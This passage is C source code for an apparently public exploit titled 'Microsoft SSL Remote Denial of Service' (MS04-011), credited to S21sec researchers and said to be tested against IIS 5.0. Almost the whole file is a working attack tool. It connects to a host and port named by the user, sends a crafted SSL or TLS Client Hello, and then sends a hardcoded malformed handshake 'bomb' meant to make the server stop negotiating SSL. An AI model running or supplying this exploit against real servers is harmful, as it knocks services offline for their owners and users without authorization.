crosoft SSL Remote Denial of Service
 * MS04-011
 *
 * Tested succesfully against IIS 5.0 with SSL.
 *
 * David Barroso Berrueta <dbarroso@s21sec.com>
 * Alfredo Andres Omella <aandres@s21sec.com>
 *
 * S21sec - http://www.s21sec.com
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <arpa/nameser.h>
#include <errno.h>

int exist_host( char *, u_long *);
void  init_hello(void);


/* begin cipher suites: */
char cipher_suites[] = /* 52 */
{0x00,0x39,0x00,0x38,0x00,0x35,0x00,0x16,0x00,0x13,0x00,0x0A,0x00,0x33,0x00
,0x32,0x00,0x2F,0x00,0x66,0x00,0x05,0x00,0x04,0x00,0x63,0x00,0x62,0x00,0x61
,0x00,0x15,0x00,0x12,0x00,0x09,0x00,0x65,0x00,0x64,0x00,0x60,0x00,0x14,0x00
,0x11,0x00,0x08,0x00,0x06,0x00,0x03};

/* begin binary data: */
char bin_data[] = /* 1308 */
{0x16,0x03,0x00,0x03,0xB8,0x01,0x00,0x03,0xB4,0x00,0x03,0xB1,0x00,0x03,0xAE
,0x30,0x82,0x03,0xAA,0x30,0x82,0x03,0x13,0xA0,0x03,0x02,0x01,0x02,0x02,0x01
,0x00,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x04,0x05
,0x00,0x30,0x81,0x9B,0x31,0x0B,0x30,0x09,0x06,0x03,0x55,0x04,0x06,0x13,0x02
,0x45,0x53,0x31,0x11,0x30,0x0F,0x06,0x03,0x55,0x04,0x08,0x13,0x08,0x50,0x61
,0x6C,0x65,0x6E,0x63,0x69,0x61,0x31,0x14,0x30,0x12,0x06,0x03,0x55,0x04,0x07
,0x13,0x0B,0x54,0x6F,0x72,0x72,0x65,0x62,0x6C,0x61,0x63,0x6F,0x73,0x31,0x0F
,0x30,0x0D,0x06,0x03,0x55,0x04,0x0A,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63
,0x31,0x19,0x30,0x17,0x06,0x03,0x55,0x04,0x0B,0x13,0x10,0x77,0x77,0x77,0x2E
,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x31,0x0F,0x30
,0x0D,0x06,0x03,0x55,0x04,0x03,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31
,0x26,0x30,0x24,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x09,0x01,0x16
,0x17,0x64,0x65,0x76,0x65,0x6C,0x6F,0x70,0x65,0x72,0x73,0x40,0x77,0x61,0x73
,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x30,0x1E,0x17,0x0D,0x30,0x34
,0x30,0x34,0x31,0x33,0x30,0x38,0x33,0x30,0x35,0x39,0x5A,0x17,0x0D,0x30,0x35
,0x30,0x34,0x31,0x33,0x30,0x38,0x33,0x30,0x35,0x39,0x5A,0x30,0x81,0x9B,0x31
,0x0B,0x30,0x09,0x06,0x03,0x55,0x04,0x06,0x13,0x02,0x45,0x53,0x31,0x11,0x30
,0x0F,0x06,0x03,0x55,0x04,0x08,0x13,0x08,0x50,0x61,0x6C,0x65,0x6E,0x63,0x69
,0x61,0x31,0x14,0x30,0x12,0x06,0x03,0x55,0x04,0x07,0x13,0x0B,0x54,0x6F,0x72
,0x72,0x65,0x62,0x6C,0x61,0x63,0x6F,0x73,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55
,0x04,0x0A,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x19,0x30,0x17,0x06
,0x03,0x55,0x04,0x0B,0x13,0x10,0x77,0x77,0x77,0x2E,0x77,0x61,0x73,0x61,0x68
,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04
,0x03,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x26,0x30,0x24,0x06,0x09
,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x09,0x01,0x16,0x17,0x64,0x65,0x76,0x65
,0x6C,0x6F,0x70,0x65,0x72,0x73,0x40,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F
,0x2E,0x6F,0x72,0x67,0x30,0x81,0x9F,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86
,0xF7,0x0D,0x01,0x01,0x01,0x05,0x00,0x03,0x81,0x8D,0x00,0x30,0x81,0x89,0x02
,0x81,0x81,0x00,0xC4,0x76,0x8B,0x8E,0x3A,0x00,0x70,0xD7,0xA0,0x36,0xCF,0xFC
,0xE8,0xBF,0x2E,0x18,0x83,0xB0,0xC5,0x7C,0x64,0x2F,0xF7,0xA8,0x31,0x70,0xF4
,0xBF,0x31,0x1D,0x81,0x57,0xD7,0x37,0xF9,0xDD,0x7C,0x4E,0xDF,0xB9,0xE2,0xAF
,0x69,0x79,0xB3,0xD5,0x59,0x91,0xED,0x27,0xF0,0x44,0x0A,0xC4,0x3C,0x43,0xF9
,0xE8,0x03,0xAE,0x10,0xDD,0x8B,0x52,0xC0,0x33,0xD7,0x9D,0x6D,0xE3,0xFF,0x03
,0x4B,0x89,0x2F,0x1A,0x73,0xCD,0x11,0x8A,0xD1,0xC1,0x40,0x21,0x2F,0x57,0x22
,0x23,0xF5,0x30,0xF8,0x8A,0x0B,0x02,0xDC,0x31,0xB5,0x4C,0xD9,0xCC,0x5A,0x83
,0xD8,0x7F,0x0A,0xC1,0x5F,0xA6,0x43,0x6C,0xD4,0xEC,0x9F,0x2F,0xEC,0x9A,0x01
,0x63,0x6D,0x30,0x11,0xB9,0xDA,0x73,0x53,0xC2,0x92,0x6B,0x02,0x03,0x01,0x00
,0x01,0xA3,0x81,0xFB,0x30,0x81,0xF8,0x30,0x1D,0x06,0x03,0x55,0x1D,0x0E,0x04
,0x16,0x04,0x14,0xE9,0x66,0x7B,0x58,0x23,0xA2,0x35,0x0F,0xD4,0x31,0x7C,0xAE
,0xC6,0x87,0x64,0x38,0x4E,0xAB,0xAA,0x58,0x30,0x81,0xC8,0x06,0x03,0x55,0x1D
,0x23,0x04,0x81,0xC0,0x30,0x81,0xBD,0x80,0x14,0xE9,0x66,0x7B,0x58,0x23,0xA2
,0x35,0x0F,0xD4,0x31,0x7C,0xAE,0xC6,0x87,0x64,0x38,0x4E,0xAB,0xAA,0x58,0xA1
,0x81,0xA1,0xA4,0x81,0x9E,0x30,0x81,0x9B,0x31,0x0B,0x30,0x09,0x06,0x03,0x55
,0x04,0x06,0x13,0x02,0x45,0x53,0x31,0x11,0x30,0x0F,0x06,0x03,0x55,0x04,0x08
,0x13,0x08,0x50,0x61,0x6C,0x65,0x6E,0x63,0x69,0x61,0x31,0x14,0x30,0x12,0x06
,0x03,0x55,0x04,0x07,0x13,0x0B,0x54,0x6F,0x72,0x72,0x65,0x62,0x6C,0x61,0x63
,0x6F,0x73,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x0A,0x13,0x06,0x53,0x32
,0x31,0x73,0x65,0x63,0x31,0x19,0x30,0x17,0x06,0x03,0x55,0x04,0x0B,0x13,0x10
,0x77,0x77,0x77,0x2E,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72
,0x67,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x03,0x13,0x06,0x53,0x32,0x31
,0x73,0x65,0x63,0x31,0x26,0x30,0x24,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D
,0x01,0x09,0x01,0x16,0x17,0x64,0x65,0x76,0x65,0x6C,0x6F,0x70,0x65,0x72,0x73
,0x40,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x82,0x01
,0x00,0x30,0x0C,0x06,0x03,0x55,0x1D,0x13,0x04,0x05,0x30,0x03,0x01,0x01,0xFF
,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x04,0x05,0x00
,0x03,0x81,0x81,0x00,0x75,0x2D,0x19,0xE1,0xAD,0x19,0x77,0x75,0xCB,0xCB,0x76
,0x88,0x38,0xF8,0xD5,0x27,0xD2,0xAB,0x79,0x7F,0x39,0x4A,0x9C,0x56,0x9A,0x5F
,0xCA,0x0C,0xAC,0x21,0x16,0xF6,0xF5,0xE2,0xE8,0xE1,0xB9,0xC2,0x29,0x25,0x52
,0xAF,0xF1,0x83,0x28,0xB0,0x00,0x7B,0xA6,0x12,0xE6,0xC7,0x4D,0x93,0x0C,0x7E
,0xD0,0x83,0x1E,0x59,0x4D,0xEB,0xDF,0xDC,0xED,0x05,0x01,0x84,0xC7,0x92,0x52
,0x65,0x26,0xAA,0x08,0x45,0x65,0x5A,0xB6,0x33,0xDC,0x2A,0xBB,0x85,0x26,0x14
,0x9C,0xBD,0xED,0xFB,0xBB,0x53,0xB3,0xA4,0xB3,0x27,0xC7,0x25,0x02,0xD4,0x0D
,0xAA,0x5E,0x2F,0x53,0xD4,0x1F,0xFB,0xFE,0x07,0x24,0xC6,0x27,0x65,0x59,0x35
,0x43,0x7D,0x28,0xD7,0x42,0x11,0x57,0x84,0x17,0x0D,0x99,0x2B,0x16,0x03,0x00
,0x00,0x84,0x10,0x00,0x00,0x80,0x2A,0x68,0x9A,0xBC,0x58,0x4D,0xA8,0xDD,0xD3
,0x95,0xC0,0xF2,0x70,0x98,0xC8,0xBE,0xE5,0x0C,0x0D,0xC1,0x40,0xD5,0x95,0x17
,0xD6,0xBF,0x04,0x2B,0xEB,0x18,0x54,0x2D,0x9F,0x72,0x55,0xCA,0x84,0x26,0xF2
,0xAF,0xFA,0x13,0xE2,0x15,0x9A,0x88,0x31,0x92,0xC5,0x1E,0xB7,0xF8,0xD7,0x2D
,0x97,0x9A,0x46,0xEF,0x73,0xFF,0xB3,0xA1,0x92,0x0B,0x64,0xC5,0xC8,0xA9,0xBB
,0x24,0xE5,0xD2,0x4B,0x49,0x0D,0x1B,0xB1,0x5F,0xE4,0x5E,0x2E,0x60,0x29,0x48
,0xB5,0xC2,0x1C,0xA5,0x53,0x7B,0x7B,0x55,0xFD,0x1A,0xAF,0x89,0x0B,0x0B,0xB4
,0x91,0x0E,0xE5,0x32,0x90,0xCD,0xB4,0xC5,0xD6,0x30,0x01,0xCD,0x83,0x29,0xDA
,0x4D,0xA5,0x51,0x0B,0x95,0xDC,0xF0,0x83,0x3C,0x81,0x18,0x3D,0x90,0x83,0x16
,0x03,0x00,0x00,0x86,0x0F,0x00,0x00,0x82,0x00,0x80,0xC0,0x56,0x18,0x55,0x92
,0xEF,0x42,0xC2,0x96,0xB5,0x9D,0x81,0x9D,0x3E,0x2A,0x9C,0x60,0x9B,0x9F,0x65
,0xF7,0xFF,0xD0,0xE8,0x2E,0xB9,0x58,0x3A,0xDC,0x68,0xA3,0xBD,0x05,0x5B,0x28
,0x66,0xF5,0x23,0x87,0xE7,0x0C,0xCE,0xD1,0x07,0x4D,0x8D,0xB8,0x40,0x86,0x12
,0xFF,0x60,0x73,0x0F,0xA6,0x91,0x71,0xAC,0x23,0xCC,0x5A,0xB1,0x5C,0xAD,0x62
,0xD5,0xE9,0x73,0xC7,0xCC,0x13,0x95,0x08,0xCE,0xD9,0x75,0xB4,0xB1,0xE5,0x46
,0x0C,0x85,0xE1,0x50,0x1A,0xBC,0x53,0x4B,0xD1,0x5B,0x1A,0xD7,0x7A,0xD7,0x47
,0xC5,0xFC,0x5B,0xA8,0x19,0xB8,0x6D,0xF6,0xD6,0x7B,0x97,0x38,0xD4,0x71,0x3E
,0x60,0xA3,0xCB,0x02,0x4C,0xB5,0x26,0xEE,0xB4,0xF9,0x31,0x3F,0xB7,0xAE,0x65
,0xBC,0x4C,0x6F,0x14,0x03,0x00,0x00,0x01,0x01,0x16,0x03,0x00,0x00,0x40,0x72
,0x12,0x84,0x91,0x08,0x56,0xDC,0x9A,0x1F,0x49,0x35,0x9F,0xC7,0x70,0x16,0x14
,0xAE,0xED,0x32,0x89,0x46,0x10,0x18,0x73,0xB5,0x40,0xB7,0xBA,0xCC,0xB0,0x75
,0xCF,0x96,0x3E,0xDC,0x0F,0x97,0xEE,0xDC,0x3A,0x0F,0xB7,0xD2,0xCD,0x8B,0x0C
,0x99,0xDB,0xA6,0x1E,0xD0,0xF9,0x32,0xCD,0x3B,0xE6,0x32,0xBD,0xC4,0xA9,0x62
,0x2F,0xD5,0xC6};


struct ssl_hello {
                   char handshake;
                   short version;
                   short length;
                   char client_hello;
                   char client_length[3];
                   short client_version;
                   int timestamp;
                   char random_bytes[28];
                   char session_id_length;
                   char session_id[32];
                   short cipher_length;
                   char cipher_suite[52];
                   char compression_length;
                   char compression_method;
} __attribute__((packed)) ssl_hello;

int tls;


int
main(int argc, char *argv[])
{
   struct sockaddr_in addr;
   int sock,i;
   char buffer[32];

   setvbuf(stdout, NULL, _IONBF, 0);

   printf("\n<*> S21sec Microsoft IIS 5.0 SSL/TLS Remote DoS <*>\n\n");

   tls=0;

   if ((argc != 4) && (argc != 3))
   {
      printf("    Usage: %s [host] [port] {t}\n", argv[0]);
      printf("         host - Host (name/IP) to connect to.\n");
      printf("         port - TCP port to connect to.\n");
      printf("            t - Enable TLS (disabled by default).\n\n");
      exit(1);
   }

   if (argc == 4)
   {
      if ( strcmp(argv[3], "t"))
      {
         printf(" -> Ouch!! What is '%s'?\n\n",argv[3]);
         exit(1);
      }
      else
      {
         tls=1;
         bin_data[2]=0x01;
      }
   }

   memset(&addr, 0, sizeof(addr));

   addr.sin_family      = AF_INET;
   addr.sin_port        = htons(atoi(argv[2]));

   if ( exist_host( argv[1], (u_long *)&(addr.sin_addr.s_addr) ) )
   {
      printf(" -> Ouch!! Wrong or nonexistant host '%s'!!\n\n",argv[1]);
      exit(1);
   }

   if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
   {
      printf(" -> Error on socket(): %s\n", strerror(errno));
      exit(1);
   }

   printf(" -> Connecting to %s:%s...",argv[1],argv[2]);
   if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
   {
      printf("\n -> Error on connect(): %s\n", strerror(errno));
      exit(1);
   }

   init_hello();

   printf(" OK\n -> Sending %s Client Hello...",((tls)?"TLS":"SSL"));
   if (write(sock, (void *)&ssl_hello, sizeof(struct ssl_hello)) == -1)
   {
      printf("\n -> Error on write(): %s\n", strerror(errno));
      exit(1);
   }

   printf(" OK\n -> Waiting for %s Server Hello...",((tls)?"TLS":"SSL"));
   if (read(sock, (void *)buffer, sizeof(buffer)) == -1)
   {
      printf("\n -> Error on read(): %s\n", strerror(errno));
      exit(1);
   }

   printf(" OK\n -> Sending bomb...");
   if (write(sock, (void *)bin_data, sizeof(bin_data)) == -1)
   {
      printf("\n -> Error on write(): %s\n", strerror(errno));
      exit(1);
   }

   for (i=0; i<6 ; i++)
   {
      printf(" B00M!!");
      usleep(350000);
   }

   close(sock);

   printf("\n ->\n -> OK. If DoS has been worked you will not be able to negotiate %s with %s:%s\n\n",
          ((tls)?"TLS":"SSL"),argv[1],argv[2]);

   exit(0);
}


int
exist_host( char *nom_host, u_long *bin_host )
{
  struct hostent *hinfo;
  struct sockaddr_in host_tmp;
  struct in_addr host_binario;

  memset( (char *)&host_tmp, 0, sizeof(host_tmp) );
  memset( (char *)&host_binario, 0, sizeof(host_binario) );

  host_tmp.sin_family = AF_INET;

  if ( inet_aton( nom_host, &host_binario) )
  {
     memcpy(  (char *)bin_host, (char *)&host_binario, sizeof(host_binario));
     return 0;
  }

  if ( (hinfo = gethostbyname( nom_host )) ) /* Put nom_host into bin_host */
  {
     memcpy((char *)&host_tmp.sin_addr, hinfo->h_addr, hinfo->h_length);
     memcpy((char *)bin_host, (char *) &host_tmp.sin_addr.s_addr,
              sizeof( host_tmp.sin_addr.s_addr));
     return 0;
  }

  return 1;
}


void
init_hello(void)
{
   ssl_hello.handshake = 0x16;

   if (!tls)
      ssl_hello.version = htons(0x0300);
   else
      ssl_hello.version = htons(0x0301);

   ssl_hello.length = htons(0x007f);
   ssl_hello.client_hello = 0x01;

   memcpy((void *)ssl_hello.client_length, (void *)"\x00\x00\x7b", 3);

   if (!tls)
      ssl_hello.client_version = htons(0x0300);
   else
      ssl_hello.client_version = htons(0x0301);

   ssl_hello.timestamp = htonl(0x407babc0);

   memset((void *) ssl_hello.random_bytes, 0x66, 28);

   ssl_hello.session_id_length = 0x20;

   memset((void *) ssl_hello.session_id, 0x66, 32);

   ssl_hello.cipher_length = htons(0x0034);

   memcpy((void *)ssl_hello.cipher_suite, (void *)cipher_suites, sizeof(cipher_suites));

   ssl_hello.compression_length = 0x01;
   ssl_hello.compression_method = 0x00;
}

